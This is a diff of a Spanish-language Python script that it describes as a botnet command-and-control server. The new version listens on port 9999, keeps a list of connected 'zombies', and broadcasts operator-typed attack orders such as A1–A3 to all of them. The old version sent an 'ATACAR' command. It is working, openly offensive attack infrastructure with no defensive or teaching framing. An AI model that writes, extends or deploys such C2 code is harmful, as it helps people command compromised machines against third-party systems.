@@ -1,48 +1,71 @@
+"""
+Pequeño script de Python que dirige un servidor CnC.
+
+NO MODIFICAR (necesariamente)
+LECTURA DEL CÓDIGO RECOMENDADA
+"""
 import socket
 import threading
 
-HOST = '0.0.0.0' # Escucha en todas las IPs
-PORT = 9999
-lista_bots = []
-print(f"--- Servidor C&C Iniciado en {HOST}:{PORT} ---")
-print("Esperando conexiones de bots...")
+# 
+BIND_IP = "0.0.0.0"
+# Vamos a usar el puerto 9999 para la conexión con el CnC
+BIND_PORT = 9999
 
-def handle_bot(conn, addr):
-    """Maneja la conexión de un bot."""
-    print(f"[+] Nuevo Bot Conectado: {addr}")
-    lista_bots.append(conn)
 
-def wait_for_connections(s):
-    """Acepta conexiones entrantes de bots."""
+
+# Lista de zombies conectados
+bots = []
+
+def manejar_bot(socket_cliente, direccion):
+    print(f"[+] Nuevo Zombie: {direccion[0]}")
+    bots.append(socket_cliente)
+    try:
+        while True:
+            # Solo para detectar desconexión
+            data = socket_cliente.recv(1024)
+            if not data: break
+    except:
+        pass
+    finally:
+        if socket_cliente in bots:
+            bots.remove(socket_cliente)
+        socket_cliente.close()
+        print(f"[-] Zombie desconectado: {direccion[0]}")
+
+def servidor():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((BIND_IP, BIND_PORT))
+    server.listen(100)
+    print(f"[*] C&C Maestro escuchando en el puerto {BIND_PORT}")
+    
     while True:
-        try:
-            conn, addr = s.accept()
-            # Lanza un hilo para manejar el bot
-            # (daemon=True para que se cierre si el script principal muere)
-            threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
-        except:
-            print("Error aceptando conexiones.")
+        client, addr = server.accept()
+        threading.Thread(target=manejar_bot, args=(client, addr)).start()
 
-# --- Hilo principal del C&C ---
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((HOST, PORT))
-s.listen(5) # Hasta 5 conexiones en cola
-
-# Iniciar el hilo que acepta bots
-threading.Thread(target=wait_for_connections, args=(s,), daemon=True).start()
-
-while True:
-    cmd = input(f"\nComando (bots={len(lista_bots)}) (presiona ENTER para ATACAR): ")
-    if cmd == "":
-        if not lista_bots:
-            print("¡No hay bots conectados!")
+def comandante():
+    print("\n--- CONSOLA DE MANDO ---")
+    print("Escribe el tipo de ataque para enviarlo a TODOS los bots.")
+    print("Comandos válidos: A1, A2, A3")
+    print("------------------------\n")
+    
+    while True:
+        orden = input("C&C> ").upper().strip()
+        if not orden: continue
+        
+        if orden == "STATUS":
+            print(f"[*] Zombies listos: {len(bots)}")
             continue
             
-        print(f"Enviando orden de ATACAR a {len(lista_bots)} bot(s)...")
-        for conn in lista_bots:
+        print(f"[*] Enviando orden '{orden}' a {len(bots)} bots...")
+        for bot in bots:
             try:
-                # Envía la orden
-                conn.sendall(b'ATACAR')
-            except Exception as e:
-                print(f"Error enviando a un bot: {e}")
-                lista_bots.remove(conn)
+                bot.send(orden.encode())
+            except:
+                pass
+
+if __name__ == "__main__":
+    # Hilo para escuchar conexiones
+    threading.Thread(target=servidor, daemon=True).start()
+    # Hilo principal para tus comandos
+    comandante()
